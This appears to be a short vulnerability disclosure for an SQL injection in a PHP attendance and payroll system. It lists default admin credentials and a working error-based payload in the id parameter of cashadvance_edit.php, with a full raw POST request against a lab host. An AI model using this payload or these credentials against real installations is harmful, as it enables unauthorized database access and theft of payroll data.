# Attendance and Payroll System v1.0 - SQL injection

username:nurhodelta password:password ----> {ip}apsystem/admin/index.php

Supplier： https://www.sourcecodester.com/php/12268/attendance-and-payroll-system-using-php.html

\admin\cashadvance_edit.php has SQL injection

Payload: id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&amount=1000&edit=

SQL injection because id can be closed

![image](https://user-images.githubusercontent.com/54017627/159258881-906b82f2-3d54-4d8a-b4e0-b0d09cae87a1.png)

```sql
POST /apsystem/admin/cashadvance_edit.php HTTP/1.1
Host: 192.168.1.17
Content-Length: 83
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.17
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.17/apsystem/admin/cashadvance.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=2nud4pa7qt6oo5odl3120a4bta
Connection: close

id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+&amount=1000&edit=
```

![image](https://user-images.githubusercontent.com/54017627/159259044-449bb655-5c60-4bf2-b66c-0d20b7656ffe.png)

![image](https://user-images.githubusercontent.com/54017627/159259071-52a66f52-727b-4243-8a73-d3a9651c2141.png)
